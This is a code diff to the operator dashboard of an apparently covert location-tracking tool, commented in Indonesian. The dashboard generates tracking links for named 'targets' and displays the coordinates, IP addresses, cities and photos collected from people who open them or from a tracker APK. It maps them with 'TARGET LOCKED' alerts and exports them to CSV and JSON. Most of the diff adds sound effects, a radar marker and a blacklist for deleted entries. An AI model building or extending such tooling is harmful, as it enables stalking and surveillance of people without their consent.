@@ -174,59 +174,12 @@
       z-index: 600; border-radius: 2px;
     }
 
-    /* RADAR */
-    .radar-overlay {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      width: 180px; height: 180px;
-      pointer-events: none; z-index: 450;
-    }
-    .radar-ring {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      border: 1px solid rgba(0,255,65,0.4);
-      border-radius: 50%;
-      box-shadow: 0 0 5px rgba(0,255,65,0.3);
-    }
-    .radar-ring.r1 { width: 60px; height: 60px; }
-    .radar-ring.r2 { width: 110px; height: 110px; }
-    .radar-ring.r3 { width: 160px; height: 160px; }
-    .radar-sweep {
-      position: absolute; top: 50%; left: 50%;
-      width: 90px; height: 90px;
-      transform-origin: 0% 50%;
-      margin-top: -1px;
-      background: linear-gradient(90deg, rgba(0,255,65,0.9) 0%, rgba(0,255,65,0.4) 40%, transparent 100%);
-      animation: sweepRotate 3s linear infinite;
-      box-shadow: 0 0 15px rgba(0,255,65,0.6);
-    }
     @keyframes sweepRotate {
       from { transform: rotate(0deg); }
       to { transform: rotate(360deg); }
     }
-    .radar-ping {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      width: 20px; height: 20px;
-      border: 2px solid #00ff41; border-radius: 50%;
-      box-shadow: 0 0 15px #00ff41;
-      animation: pingExpand 2s ease-out infinite;
-    }
-    .radar-ping.p2 { animation-delay: 1s; }
-    @keyframes pingExpand {
-      0% { width: 20px; height: 20px; opacity: 1; border-width: 2px; }
-      100% { width: 180px; height: 180px; opacity: 0; border-width: 1px; }
-    }
-    .radar-center {
-      position: absolute; top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      width: 8px; height: 8px;
-      background: #ff3366; border-radius: 50%;
-      box-shadow: 0 0 15px #ff3366, 0 0 30px #ff3366;
-      animation: blink 1s infinite;
-    }
+    @keyframes blink2 { 50% { opacity: 0.3; } }
 
-    /* POPUP TARGET */
     .target-popup .leaflet-popup-content-wrapper {
       background: #000; border: 2px solid #00ff41;
       border-radius: 4px;
@@ -254,6 +207,14 @@
     .notif-btn.active { background: #00ff41; color: #000; box-shadow: 0 0 10px #00ff41; }
     .chat-btn { border-color: #00ffff; color: #00ffff; }
     .chat-btn:hover { background: #00ffff; color: #000; }
+
+    .sound-btn {
+      background: transparent; border: 1px solid #00ff41;
+      color: #00ff41; font-family: 'Courier New', monospace;
+      font-size: 10px; padding: 5px 10px; cursor: pointer;
+      letter-spacing: 1px; border-radius: 3px;
+    }
+    .sound-btn.active { background: #00ff41; color: #000; box-shadow: 0 0 10px #00ff41; }
 
     .chat-panel {
       position: fixed; inset: 0; background: #000;
@@ -396,13 +357,13 @@
         <div class="time" id="liveClock">--:--:--</div>
         <button class="logout-btn" onclick="logout()">EXIT</button>
       </div>
-      <div style="margin-top: 10px; display: flex; justify-content: space-between; align-items: center; gap: 6px;">
+      <div style="margin-top: 10px; display: flex; justify-content: space-between; align-items: center; gap: 6px; flex-wrap: wrap;">
         <div style="font-size: 10px; color: #7fff7f;">
           <span class="dot-status"></span>ONLINE
         </div>
-        <div style="display: flex; gap: 6px;">
+        <div style="display: flex; gap: 6px; flex-wrap: wrap;">
           <button class="chat-btn" onclick="openChat()">💬 CHAT <span id="chatBadge" style="display:none;background:#ff3366;color:#fff;padding:1px 4px;font-size:9px;border-radius:8px;">0</span></button>
-          <button class="notif-btn active" id="soundToggle" onclick="toggleSound()">🔊 ON</button>
+          <button class="sound-btn active" id="soundToggle" onclick="toggleSound()">🔊 ON</button>
         </div>
       </div>
     </div>
@@ -426,20 +387,9 @@
         <div id="mapLink" class="map-el"></div>
         <div class="map-grid"></div>
         <div class="map-crosshair"></div>
-        <div class="radar-overlay">
-          <div class="radar-ring r1"></div>
-          <div class="radar-ring r2"></div>
-          <div class="radar-ring r3"></div>
-          <div class="radar-sweep"></div>
-          <div class="radar-ping"></div>
-          <div class="radar-ping p2"></div>
-          <div class="radar-center"></div>
-        </div>
         <div class="map-label">TARGET LOCKED</div>
         <div class="map-coords" id="mapLinkCoords">--, --</div>
       </div>
-
-      <button class="term-btn outline" id="btnRecord" onclick="rekamAnimasi()" style="display:none; margin-bottom: 10px;">[ 🎬 REKAM & DOWNLOAD VIDEO ]</button>
 
       <div class="search-row">
         <input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()">
@@ -472,15 +422,6 @@
         <div id="mapApk" class="map-el"></div>
         <div class="map-grid"></div>
         <div class="map-crosshair"></div>
-        <div class="radar-overlay">
-          <div class="radar-ring r1"></div>
-          <div class="radar-ring r2"></div>
-          <div class="radar-ring r3"></div>
-          <div class="radar-sweep"></div>
-          <div class="radar-ping"></div>
-          <div class="radar-ping p2"></div>
-          <div class="radar-center"></div>
-        </div>
         <div class="map-label">APK TRACKER</div>
         <div class="map-coords" id="mapApkCoords">--, --</div>
       </div>
@@ -561,6 +502,150 @@ const user = localStorage.getItem('username');
 if (!user) location.href = 'index.html';
 document.getElementById('userLabel').innerText = user;
 
+// ============================================
+// 🔊 SOUND SYSTEM
+// ============================================
+let soundEnabled = localStorage.getItem('soundEnabled') !== 'false';
+
+window.toggleSound = () => {
+  soundEnabled = !soundEnabled;
+  localStorage.setItem('soundEnabled', soundEnabled);
+  const btn = document.getElementById('soundToggle');
+  if (soundEnabled) {
+    btn.innerText = '🔊 ON';
+    btn.classList.add('active');
+    playKlik();
+  } else {
+    btn.innerText = '🔇 OFF';
+    btn.classList.remove('active');
+  }
+};
+
+// Set tampilan tombol saat load
+setTimeout(() => {
+  const btn = document.getElementById('soundToggle');
+  if (soundEnabled) {
+    btn.innerText = '🔊 ON';
+    btn.classList.add('active');
+  } else {
+    btn.innerText = '🔇 OFF';
+    btn.classList.remove('active');
+  }
+}, 100);
+
+function beepSimple(freq, dur) {
+  if (!soundEnabled) return;
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.type = 'sine';
+    osc.frequency.value = freq;
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    gain.gain.setValueAtTime(0.12, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
+    osc.start();
+    osc.stop(ctx.currentTime + dur);
+  } catch(e) {}
+}
+
+// 🔊 Bunyi klik tombol (pendek)
+function playKlik() {
+  if (!soundEnabled) return;
+  beepSimple(2200, 0.03);
+}
+
+// 🔊 Bunyi ketik
+function typingSound() {
+  if (!soundEnabled) return;
+  beepSimple(1800 + Math.random() * 400, 0.02);
+}
+
+// 🔊 Bunyi pemberitahuan (data baru) — tit tit tit 10 detik
+function targetLockedSound() {
+  if (!soundEnabled) return;
+  let count = 0;
+  const timer = setInterval(() => {
+    beepSimple(1600, 0.08);
+    setTimeout(() => beepSimple(2000, 0.08), 80);
+    count++;
+    if (count >= 20) clearInterval(timer);
+  }, 500);
+}
+
+// 🔊 Bunyi APK kirim (5 detik)
+function apkUpdateSound() {
+  if (!soundEnabled) return;
+  let count = 0;
+  const timer = setInterval(() => {
+    beepSimple(1200, 0.06);
+    count++;
+    if (count >= 15) clearInterval(timer);
+  }, 333);
+}
+
+// ============================================
+// 🎙️ VOICE CEWEK
+// ============================================
+let suaraCewek = null;
+function loadVoice() {
+  if (!window.speechSynthesis) return;
+  const voices = window.speechSynthesis.getVoices();
+  suaraCewek = voices.find(v => v.lang.includes('id') && v.name.toLowerCase().includes('female'))
+    || voices.find(v => v.lang.includes('id'))
+    || voices.find(v => v.name.toLowerCase().includes('female') || v.name.toLowerCase().includes('zira'))
+    || voices.find(v => v.lang.includes('en'))
+    || voices[0];
+}
+if (window.speechSynthesis) {
+  window.speechSynthesis.onvoiceschanged = loadVoice;
+  loadVoice();
+}
+function ucapkan(text) {
+  if (!window.speechSynthesis) return;
+  try {
+    window.speechSynthesis.cancel();
+    const u = new SpeechSynthesisUtterance(text);
+    if (suaraCewek) u.voice = suaraCewek;
+    u.rate = 1.0;
+    u.pitch = 1.4;
+    u.volume = 1.0;
+    u.lang = 'id-ID';
+    window.speechSynthesis.speak(u);
+  } catch(e) {}
+}
+
+// 🎙️ Suara cewek "Connect Success" saat dashboard dibuka
+function loginSuccessVoice() {
+  // Beep 3x naik
+  beepSimple(800, 0.15);
+  setTimeout(() => beepSimple(1200, 0.15), 150);
+  setTimeout(() => beepSimple(1600, 0.15), 300);
+  // Suara cewek
+  setTimeout(() => {
+    ucapkan('Connect success. Welcome, operator ' + user + '. System ready.');
+  }, 700);
+}
+
+// 🎙️ Suara hacker 8 detik saat target locked
+function hackerVoice8Detik() {
+  if (!soundEnabled) return;
+  const kalimat = [
+    { text: 'Initiating satellite scan.', delay: 0 },
+    { text: 'Locating target position.', delay: 2200 },
+    { text: 'Coordinates locked.', delay: 4500 },
+    { text: 'Target acquired.', delay: 6500 }
+  ];
+  kalimat.forEach(k => setTimeout(() => ucapkan(k.text), k.delay));
+}
+
+window.logout = () => {
+  playKlik();
+  localStorage.removeItem('username');
+  location.href = 'index.html';
+};
+
 function updateClock() {
   const now = new Date();
   const h = String(now.getHours()).padStart(2,'0');
@@ -583,156 +668,19 @@ function addLog(msg, type = '') {
 addLog('Terminal v1.0 initialized');
 addLog('User: ' + user);
 
-// SOUND
-let soundEnabled = true;
-window.toggleSound = () => {
-  soundEnabled = !soundEnabled;
-  const btn = document.getElementById('soundToggle');
-  if (soundEnabled) {
-    btn.innerText = '🔊 ON';
-    btn.classList.add('active');
-    beepSimple(880, 0.1);
-  } else {
-    btn.innerText = '🔇 OFF';
-    btn.classList.remove('active');
-  }
-};
+// 🎙️ PANGGIL SUARA CEWEK SAAT DASHBOARD DIBUKA
+setTimeout(() => {
+  loginSuccessVoice();
+  addLog('🎙️ Connect success - Welcome ' + user, 'warn');
+}, 800);
 
-function beepSimple(freq, dur) {
-  if (!soundEnabled) return;
-  try {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-    osc.type = 'sine';
-    osc.frequency.value = freq;
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    gain.gain.setValueAtTime(0.12, ctx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
-    osc.start();
-    osc.stop(ctx.currentTime + dur);
-  } catch(e) {}
-}
-
-function typingSound() {
-  if (!soundEnabled) return;
-  beepSimple(1800 + Math.random() * 400, 0.02);
-}
-
-function targetLockedSound() {
-  if (!soundEnabled) return;
-  let count = 0;
-  const timer = setInterval(() => {
-    beepSimple(1600, 0.08);
-    setTimeout(() => beepSimple(2000, 0.08), 80);
-    count++;
-    if (count >= 20) clearInterval(timer);
-  }, 500);
-}
-
-function apkUpdateSound() {
-  if (!soundEnabled) return;
-  let count = 0;
-  const timer = setInterval(() => {
-    beepSimple(1200, 0.06);
-    count++;
-    if (count >= 15) clearInterval(timer);
-  }, 333);
-}
-
-// VOICE
-let suaraCewek = null;
-function loadVoice() {
-  if (!window.speechSynthesis) return;
-  const voices = window.speechSynthesis.getVoices();
-  suaraCewek = voices.find(v => v.lang.includes('id') && v.name.toLowerCase().includes('female'))
-    || voices.find(v => v.lang.includes('id'))
-    || voices.find(v => v.name.toLowerCase().includes('female') || v.name.toLowerCase().includes('zira'))
-    || voices.find(v => v.lang.includes('en'))
-    || voices[0];
-}
-if (window.speechSynthesis) {
-  window.speechSynthesis.onvoiceschanged = loadVoice;
-  loadVoice();
-}
-function ucapkan(text) {
-  if (!soundEnabled || !window.speechSynthesis) return;
-  try {
-    window.speechSynthesis.cancel();
-    const u = new SpeechSynthesisUtterance(text);
-    if (suaraCewek) u.voice = suaraCewek;
-    u.rate = 1.0;
-    u.pitch = 1.4;
-    u.volume = 0.9;
-    u.lang = 'id-ID';
-    window.speechSynthesis.speak(u);
-  } catch(e) {}
-}
-function hackerVoice8Detik() {
-  if (!soundEnabled) return;
-  const kalimat = [
-    { text: 'Initiating satellite scan.', delay: 0 },
-    { text: 'Locating target position.', delay: 2200 },
-    { text: 'Coordinates locked.', delay: 4500 },
-    { text: 'Target acquired.', delay: 6500 }
-  ];
-  kalimat.forEach(k => setTimeout(() => ucapkan(k.text), k.delay));
-}
-
-window.logout = () => {
-  localStorage.removeItem('username');
-  location.href = 'index.html';
-};
-
-// VIDEO RECORDER
-let mediaRecorder = null;
-let recordedChunks = [];
-let isRecording = false;
-window.rekamAnimasi = async () => {
-  if (isRecording) { alert('Sedang merekam...'); return; }
-  if (!window.MediaRecorder) { alert('Browser tidak support rekam'); return; }
-  try {
-    const mapEl = document.getElementById('mapLink');
-    const stream = mapEl.captureStream(30);
-    const options = { mimeType: 'video/webm;codecs=vp9' };
-    if (!MediaRecorder.isTypeSupported(options.mimeType)) options.mimeType = 'video/webm;codecs=vp8';
-    if (!MediaRecorder.isTypeSupported(options.mimeType)) options.mimeType = 'video/webm';
-    mediaRecorder = new MediaRecorder(stream, options);
-    recordedChunks = [];
-    isRecording = true;
-    const btn = document.getElementById('btnRecord');
-    btn.innerText = '⏺ RECORDING... (8 detik)';
-    btn.style.background = '#ff3366';
-    btn.style.color = '#fff';
-    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-    mediaRecorder.onstop = () => {
-      const blob = new Blob(recordedChunks, { type: 'video/webm' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = `cyber_tracking_${Date.now()}.webm`;
-      a.click();
-      URL.revokeObjectURL(url);
-      btn.innerText = '[ 🎬 REKAM & DOWNLOAD VIDEO ]';
-      btn.style.background = '';
-      btn.style.color = '';
-      isRecording = false;
-      addLog('🎬 Video downloaded');
-    };
-    mediaRecorder.start();
-    setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, 8000);
-    addLog('🎬 Recording (8 detik)');
-  } catch(e) {
-    alert('Gagal rekam: ' + e.message);
-    isRecording = false;
-  }
-};
-
+// ============================================
 // MAP APK
+// ============================================
 let mapApk = null, markerApk = null;
 let lastApkCount = 0;
 let firstApkLoad = true;
+
 function initMapApk() {
   mapApk = L.map('mapApk', {
     zoomControl: false, attributionControl: false,
@@ -742,6 +690,22 @@ function initMapApk() {
 }
 initMapApk();
 
+// RADAR ICON
+function radarIcon() {
+  return L.divIcon({
+    html: `
+      <div style="position:relative; width:140px; height:140px;">
+        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:50px; height:50px; border:1px solid rgba(0,255,65,0.5); border-radius:50%;"></div>
+        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:90px; height:90px; border:1px solid rgba(0,255,65,0.5); border-radius:50%;"></div>
+        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:130px; height:130px; border:1px solid rgba(0,255,65,0.5); border-radius:50%;"></div>
+        <div style="position:absolute; top:50%; left:50%; width:65px; height:65px; margin-top:-1px; transform-origin:0% 50%; background:linear-gradient(90deg, rgba(0,255,65,0.9) 0%, rgba(0,255,65,0.4) 40%, transparent 100%); animation:sweepRotate 2s linear infinite;"></div>
+        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:12px; height:12px; background:#ff3366; border-radius:50%; border:2px solid #fff; box-shadow:0 0 15px #ff3366;"></div>
+      </div>
+    `,
+    className: '', iconSize: [140, 140], iconAnchor: [70, 70]
+  });
+}
+
 onValue(ref(db, 'lokasi/' + user), snap => {
   const data = snap.val();
   if (!data) {
@@ -749,10 +713,14 @@ onValue(ref(db, 'lokasi/' + user), snap => {
     document.getElementById('apkTime').innerText = 'Waiting APK...';
     return;
   }
+
+  const blacklist = JSON.parse(localStorage.getItem('blacklist_' + user) || '[]');
   const apkEntries = Object.entries(data)
-    .filter(([k, d]) => d.mode && !d.target)
+    .filter(([k, d]) => d.mode && !d.target && !blacklist.includes(k))
     .sort((a,b) => b[1].waktu - a[1].waktu);
+
   if (apkEntries.length === 0) return;
+
   const latest = apkEntries[0][1];
   document.getElementById('apkUser').innerText = latest.user || user;
   document.getElementById('apkLat').innerText = latest.lat ? latest.lat.toFixed(6) : '-';
@@ -760,11 +728,14 @@ onValue(ref(db, 'lokasi/' + user), snap => {
   document.getElementById('apkAkurasi').innerText = latest.akurasi ? latest.akurasi.toFixed(2) + ' m' : '-';
   document.getElementById('apkDevice').innerText = latest.device || '-';
   document.getElementById('apkTime').innerText = new Date(latest.waktu).toLocaleString('id-ID');
+
   if (latest.lat && latest.lng) {
     document.getElementById('mapApkCoords').innerText = latest.lat.toFixed(4) + ', ' + latest.lng.toFixed(4);
-    if (markerApk) markerApk.setLatLng([latest.lat, latest.lng]);
-    else {
-      markerApk = L.marker([latest.lat, latest.lng]).addTo(mapApk);
+
+    if (markerApk) {
+      markerApk.setLatLng([latest.lat, latest.lng]);
+    } else {
+      markerApk = L.marker([latest.lat, latest.lng], { icon: radarIcon() }).addTo(mapApk);
       markerApk.bindPopup(
         '<div style="text-align:center; padding:6px;"><b>' + (latest.user || user).toUpperCase() + '</b><br>' + latest.lat.toFixed(5) + ', ' + latest.lng.toFixed(5) + '</div>',
         { className: 'target-popup', closeButton: false }
@@ -772,6 +743,7 @@ onValue(ref(db, 'lokasi/' + user), snap => {
     }
     mapApk.setView([latest.lat, latest.lng], mapApk.getZoom());
   }
+
   if (!firstApkLoad && apkEntries.length > lastApkCount) {
     apkUpdateSound();
     addLog('📡 APK kirim lokasi baru', 'warn');
@@ -782,15 +754,19 @@ onValue(ref(db, 'lokasi/' + user), snap => {
 });
 
 window.bukaMapsApk = () => {
+  playKlik();
   const lat = document.getElementById('apkLat').innerText;
   const lng = document.getElementById('apkLng').innerText;
   if (lat === '-' || lng === '-') { addLog('No location', 'err'); return; }
   window.open('https://www.google.com/maps?q=' + lat + ',' + lng, '_blank');
 };
 
+// ============================================
 // GENERATE LINK
+// ============================================
 let currentLink = '';
 window.genLink = () => {
+  playKlik();
   const target = document.getElementById('targetName').value.trim() || 'target';
   const url = `${location.origin}/track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
   currentLink = url;
@@ -799,7 +775,9 @@ window.genLink = () => {
   addLog('Link generated: ' + target);
   beepSimple(900, 0.08);
 };
+
 window.copyLink = async () => {
+  playKlik();
   if (!currentLink) return;
   try {
     await navigator.clipboard.writeText(currentLink);
@@ -808,12 +786,15 @@ window.copyLink = async () => {
   } catch(e) {}
 };
 
+// ============================================
 // MAP LINK
+// ============================================
 let allData = [];
 let lastCount = 0;
 let firstLoad = true;
 let mapLink = null, markerLink = null;
 let mapAnimated = false;
+let lastAnimatedKey = '';
 
 function initMapLink() {
   mapLink = L.map('mapLink', {
@@ -839,9 +820,12 @@ function generateID(waktu) {
 function getFilteredData() {
   const search = (document.getElementById('searchInput')?.value || '').toLowerCase().trim();
   const dateFilter = document.getElementById('filterDate')?.value || 'all';
+  const blacklist = JSON.parse(localStorage.getItem('blacklist_' + user) || '[]');
   const now = new Date();
   const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
+
   return allData.filter(([key, d]) => {
+    if (blacklist.includes(key)) return false;
     if (search) {
       const t = (d.target || '').toLowerCase();
       const k = (d.kota || '').toLowerCase();
@@ -887,9 +871,13 @@ function renderData() {
     </div>
   `).join('');
 
-  if (!mapAnimated && filtered[0][1].lat) {
-    mapAnimated = true;
-    animasiMapLink(filtered[0][1].lat, filtered[0][1].lng, filtered[0][1].target || 'unknown');
+  // AUTO-UPDATE PETA ke data terbaru
+  if (filtered.length > 0 && filtered[0][1].lat) {
+    const latestKey = filtered[0][0];
+    if (latestKey !== lastAnimatedKey) {
+      lastAnimatedKey = latestKey;
+      animasiMapLink(filtered[0][1].lat, filtered[0][1].lng, filtered[0][1].target || 'unknown');
+    }
   }
 }
 
@@ -919,11 +907,7 @@ function animasiMapLink(lat, lng, target) {
   let idx = 0;
   function play() {
     if (idx >= stages.length) {
-      const icon = L.divIcon({
-        html: '<div style="width:20px;height:20px;background:#00ff41;border-radius:50%;box-shadow:0 0 15px #00ff41;border:2px solid #fff;animation:pulse 1s infinite;"></div>',
-        className: '', iconSize: [20,20], iconAnchor: [10,10]
-      });
-      markerLink = L.marker([lat, lng], { icon: icon }).addTo(mapLink);
+      markerLink = L.marker([lat, lng], { icon: radarIcon() }).addTo(mapLink);
 
       let fotoTarget = '';
       try {
@@ -932,29 +916,29 @@ function animasiMapLink(lat, lng, target) {
       } catch(e) {}
 
       markerLink.bindPopup(
-        '<div style="font-family:Courier New, monospace; text-align:center; color:#00ff41; min-width:130px;">' +
-          '<div style="background:#000; border:1px solid #00ff41; padding:4px; font-size:9px; letter-spacing:1px; margin-bottom:4px;">◉ TARGET LOCKED</div>' +
+        '<div style="font-family:Courier New, monospace; text-align:center; color:#00ff41; min-width:100px;">' +
+          '<div style="background:#000; border:1px solid #00ff41; padding:3px; font-size:8px; letter-spacing:1px; margin-bottom:3px;">◉ TARGET LOCKED</div>' +
           (fotoTarget ?
             '<div style="position:relative; padding:3px; background:#000; border:1px solid #00ff41; border-top:none; border-bottom:none;">' +
-              '<img src="' + fotoTarget + '" style="width:110px; height:140px; object-fit:cover; border:1.5px solid #00c853; box-shadow:0 0 10px #00c853; display:block; margin:0 auto; filter:brightness(1.4) contrast(1.1);">' +
-              '<div style="position:absolute; top:6px; left:50%; transform:translateX(-50%); background:rgba(255,51,102,0.9); color:#fff; font-size:7px; padding:1px 5px; letter-spacing:1px;">● LIVE</div>' +
+              '<img src="' + fotoTarget + '" style="width:70px; height:90px; object-fit:cover; border:1.5px solid #00c853; box-shadow:0 0 8px #00c853; display:block; margin:0 auto; filter:brightness(1.4) contrast(1.1);">' +
+              '<div style="position:absolute; top:5px; left:50%; transform:translateX(-50%); background:rgba(255,51,102,0.9); color:#fff; font-size:6px; padding:1px 4px;">● LIVE</div>' +
             '</div>'
           : '') +
-          '<div style="background:#000; border:1px solid #00ff41; border-top:none; padding:5px; font-size:9px;">' +
-            '<div style="font-weight:bold; color:#00ffff; letter-spacing:1px; margin-bottom:2px;">' + target.toUpperCase() + '</div>' +
-            '<div style="color:#7fff7f; font-size:8px;">' + lat.toFixed(4) + ', ' + lng.toFixed(4) + '</div>' +
-            '<div style="color:#7fff7f; font-size:8px; margin-top:2px;">' + new Date().toLocaleTimeString('id-ID') + '</div>' +
+          '<div style="background:#000; border:1px solid #00ff41; border-top:none; padding:4px; font-size:8px;">' +
+            '<div style="font-weight:bold; color:#00ffff; margin-bottom:2px;">' + target.toUpperCase() + '</div>' +
+            '<div style="color:#7fff7f; font-size:7px;">' + lat.toFixed(4) + ', ' + lng.toFixed(4) + '</div>' +
+            '<div style="color:#7fff7f; font-size:7px; margin-top:2px;">' + new Date().toLocaleTimeString('id-ID') + '</div>' +
           '</div>' +
         '</div>',
-        { className: 'target-popup', closeButton: false, maxWidth: 160 }
+        { className: 'target-popup', closeButton: false, maxWidth: 130 }
       ).openPopup();
 
       if (statusEl) statusEl.innerText = '◉ TARGET LOCKED';
       targetLockedSound();
       hackerVoice8Detik();
-      document.getElementById('btnRecord').style.display = 'block';
       addLog('🎯 Target locked: ' + target);
       addLog('🔊 Alert 10 detik + hacker voice');
+
       mapLink.dragging.enable();
       mapLink.scrollWheelZoom.enable();
       return;
@@ -980,6 +964,7 @@ onValue(ref(db, 'lokasi/' + user), snap => {
   allData = Object.entries(data)
     .filter(([k,d]) => d.target)
     .sort((a,b) => b[1].waktu - a[1].waktu);
+
   if (!firstLoad && allData.length > lastCount) {
     addLog('New link data received!', 'warn');
   }
@@ -989,21 +974,43 @@ onValue(ref(db, 'lokasi/' + user), snap => {
 });
 
 window.filterData = () => renderData();
+
 window.deleteItem = async (key) => {
+  playKlik();
   if (!confirm('Hapus data ini?')) return;
-  try { await remove(ref(db, 'lokasi/' + user + '/' + key)); addLog('Data deleted'); } catch(e) {}
+  try {
+    const blacklist = JSON.parse(localStorage.getItem('blacklist_' + user) || '[]');
+    if (!blacklist.includes(key)) blacklist.push(key);
+    localStorage.setItem('blacklist_' + user, JSON.stringify(blacklist));
+    await remove(ref(db, 'lokasi/' + user + '/' + key));
+    addLog('Data deleted & blacklisted');
+    beepSimple(600, 0.1);
+    renderData();
+  } catch(e) {
+    addLog('Delete failed', 'err');
+  }
 };
+
 window.clearAll = async () => {
+  playKlik();
   if (!confirm('Yakin hapus SEMUA data LINK?')) return;
   try {
     const data = (await new Promise(r => onValue(ref(db, 'lokasi/' + user), r, { onlyOnce: true }))).val();
+    const blacklist = JSON.parse(localStorage.getItem('blacklist_' + user) || '[]');
     for (const [k, v] of Object.entries(data || {})) {
-      if (v.target) await remove(ref(db, 'lokasi/' + user + '/' + k));
+      if (v.target) {
+        if (!blacklist.includes(k)) blacklist.push(k);
+        await remove(ref(db, 'lokasi/' + user + '/' + k));
+      }
     }
+    localStorage.setItem('blacklist_' + user, JSON.stringify(blacklist));
     addLog('All link data cleared');
+    renderData();
   } catch(e) {}
 };
+
 window.downloadCard = async (key) => {
+  playKlik();
   const card = document.getElementById('card-' + key);
   if (!card) return;
   try {
@@ -1014,7 +1021,9 @@ window.downloadCard = async (key) => {
     link.click();
   } catch(e) { alert('Failed: ' + e.message); }
 };
+
 window.exportCSV = () => {
+  playKlik();
   if (allData.length === 0) return alert('No data');
   const rows = [['ID','Target','Waktu','Kota','Lat','Lng','IP']];
   allData.forEach(([k,d]) => rows.push([generateID(d.waktu), d.target||'', new Date(d.waktu).toLocaleString('id-ID'), d.kota||'', d.lat||'', d.lng||'', d.ip||'']));
@@ -1025,7 +1034,9 @@ window.exportCSV = () => {
   link.download = `cyber_${Date.now()}.csv`;
   link.click();
 };
+
 window.exportJSON = () => {
+  playKlik();
   if (allData.length === 0) return alert('No data');
   const dataExport = allData.map(([k,d]) => { const c = {...d}; if (c.foto) c.foto='[HIDDEN]'; return c; });
   const blob = new Blob([JSON.stringify(dataExport, null, 2)], {type:'application/json'});
@@ -1035,21 +1046,27 @@ window.exportJSON = () => {
   link.click();
 };
 
+// ============================================
 // CHAT
+// ============================================
 let chatOpen = false;
 let chatFirst = true;
 let chatLastCount = 0;
+
 window.openChat = () => {
+  playKlik();
   document.getElementById('chatPanel').classList.add('show');
   chatOpen = true;
   document.getElementById('chatBadge').style.display = 'none';
   setTimeout(() => { scrollChat(); document.getElementById('chatInput').focus(); }, 300);
 };
 window.closeChat = () => {
+  playKlik();
   document.getElementById('chatPanel').classList.remove('show');
   chatOpen = false;
 };
 window.sendChat = async () => {
+  playKlik();
   const input = document.getElementById('chatInput');
   const msg = input.value.trim();
   if (!msg) return;
@@ -1057,6 +1074,7 @@ window.sendChat = async () => {
   try { await push(ref(db, 'chat/global'), { user: user, pesan: msg, waktu: Date.now() }); } catch(e) {}
 };
 window.deleteChat = async (key) => {
+  playKlik();
   if (!confirm('Hapus pesan?')) return;
   try { await remove(ref(db, 'chat/global/' + key)); } catch(e) {}
 };
